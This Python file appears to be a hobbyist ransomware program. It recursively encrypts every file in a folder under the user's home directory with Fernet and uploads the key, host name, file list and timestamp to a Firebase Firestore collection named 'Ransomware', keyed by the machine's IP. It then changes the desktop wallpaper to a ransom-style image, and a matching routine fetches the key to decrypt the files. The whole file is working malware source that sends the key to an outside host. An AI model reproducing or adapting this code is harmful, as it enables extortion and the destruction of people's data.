from cryptography.fernet import Fernet
import os
import glob
import socket
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
import datetime
import ctypes


class DecryptFirebase(object):
    def __init__(self):
        self.hostname = socket.gethostname() 
        self.IP = socket.gethostbyname(self.hostname) 
        self.AccessKey = ""

    # Firebase Setup
    cred = credentials.Certificate("Encrypter-Decrypter\serviceAccountKey.json")
    firebase_admin.initialize_app(cred)
    database=firestore.client()
    
    ClientInformation = {}
    def GetRansomeInformation(self):
        ClientInformation = (self.database.collection('Ransomware').document('client_'+self.IP).get())
        if ClientInformation.exists:
            self.ClientInformation = ClientInformation.to_dict()
            self.AccessKey = self.ClientInformation['Key'].split("'")[1]
            # print(ClientInformation)
        else:
            print("No Client Information Found")
            
class EcryptFirebase(object):
    def __init__(self):
        self.hostname = socket.gethostname() 
        self.IP = socket.gethostbyname(self.hostname)     
        self.db=firestore.client()
    # Add Data
    def RansomwareInformation(self,Data):
        self.db.collection('Ransomware').document('client_'+self.IP).set(Data)

def Decrypter_Ransomware():
    DRans = DecryptFirebase()
    DRans.GetRansomeInformation()
    key = DRans.AccessKey
    fernet = Fernet(key)
    Recursive_Dir = os.path.expanduser("~")
    Files = glob.glob(f'{Recursive_Dir}\\Random Test Files\\**\\*.*',recursive=True)
    for File in Files:
        try:
            with open(File,"rb") as tf:
                tf_bytes = tf.read()
        except:
            pass
        try:
            tf_bytes_doc = fernet.decrypt(tf_bytes)
        except Exception as e:
            print("Error in Decrypting File : " + File +" is "+str(e))
            pass
        with open(File,"wb") as tf:
            tf.write(tf_bytes_doc)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\Users\\Sanjeev Arora\\Python-Projects\\Ransomware\\Images\\Access Granted.jpg" , 0)
    print("Data is Successfully Decrypted ")

def Encrypter_Ransomware():
    Recursive_Dir = os.path.expanduser("~")
    print("Recursive Directory : - ",Recursive_Dir)
    key = Fernet.generate_key()
    # with open("Key.key","wb") as keyFile:
    #     keyFile.write(key)
    Files = glob.glob(f'{Recursive_Dir}\\Random Test Files\\**\\*.*',recursive=True)
    AccessedFiles=[]
    for item in Files:
        AccessedFiles.append(item)
        print(item)
    fernet = Fernet(key)
    for File in Files:
        with open(File,"rb") as tf:
            tf_bytes = tf.read()
        tf_bytes_enc = fernet.encrypt(tf_bytes)
        with open(File,"wb") as tf:
            tf.write(tf_bytes_enc)



    Rans = EcryptFirebase()
    EncryptedData = {
        'PC-NAME':Rans.hostname,
        'DOH': datetime.datetime.now(tz=datetime.timezone.utc),
        'FILES':AccessedFiles,
        'Key':str(key)
    }
    Rans.RansomwareInformation(EncryptedData)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\Users\\Sanjeev Arora\\Python-Projects\\Ransomware\\Images\\Access Denied.jpg" , 0)
    print("Data is Successfully Encrypted ")

# Encrypter_Ransomware()
# Decrypter_Ransomware()